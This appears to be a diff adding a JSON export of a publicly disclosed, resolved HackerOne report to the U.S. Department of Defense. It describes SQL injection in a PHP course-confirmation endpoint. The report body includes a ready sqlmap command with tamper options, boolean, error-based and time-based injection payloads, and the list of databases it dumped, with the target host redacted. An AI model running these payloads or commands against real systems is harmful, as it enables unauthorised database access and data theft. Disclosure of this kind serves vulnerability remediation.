@@ -1,0 +1,129 @@
+{
+  "id": 1626198,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjI2MTk4",
+  "url": "https://hackerone.com/reports/1626198",
+  "title": "SQL injection at [█████████] [HtUS]",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-05T14:01:06.901Z",
+  "submitted_at": "2022-07-05T14:01:06.968Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "malcolmx",
+    "url": "/malcolmx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/043/962/0448fa629279eb47ceced2514304c8256b112624_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-09-14T21:06:26.137Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-09-11T11:24:40.633Z",
+  "team_member_agreed_on_going_public_at": "2022-09-14T21:06:25.989Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\n\n##Summary\n\nwhile doing test on [`█████`](http://███████/) I’ve found that the endpoint at `/olc/set/m101/leasib.php` is vulnerable with SQL injection vulnerability\n\n##Vulnerable parameters \n\n- scn\n- SUBJECT\n- COURSEID\n\n##POC\n\n1. using sqlmap run command `python3 [sqlmap.py](http://sqlmap.py/) --level=5 --risk=3 --tamper=space2comment --random-agent -u [https://████/olc/set/m101/leasib.php](https://█████/olc/set/m101/leasib.php) --data=\"COURSEID=M101&SUBJECT=Entry%20Briefing&StudentName=dPbRKJwr&Submit=Submit%20Confirmation&scn=0\" -p scn`\n2. we can se that the target is vulnerable \n\n```jsx\nParameter: scn (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x5648745a FROM DUAL WHERE 7300=7300 AND 1308=1308)||'\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47636148 FROM DUAL WHERE 1321=1321 AND (SELECT 7303 FROM(SELECT COUNT(*),CONCAT(0x7171706271,(SELECT (ELT(7303=7303,1))),0x71716b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47774954 FROM DUAL WHERE 5475=5475 AND (SELECT 6347 FROM (SELECT(SLEEP(5)))eoxH))||'\n---\n```\n\n1. add - -dbs we can see the databases   \n\n```jsx\navailable databases [13]:\n[*] ███\n[*] ███mobile\n[*] GET\n[*] information_schema\n[*] LEAM\n[*] leat\n[*] LEV\n[*] mysql\n[*] performance_schema\n[*] SET\n[*] test\n[*] testadmin\n[*] testusers\n```\n\n## Impact\n\nallows remote attacker to gain access to the database",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 17,
+  "voters": [
+    "0xm5awy",
+    "m4khn0",
+    "zy9ard3",
+    "shreyaschavhan",
+    "red_darkin",
+    "spell1",
+    "khizer47",
+    "shivammusic",
+    "shohag_sp",
+    "born2los3built2win",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
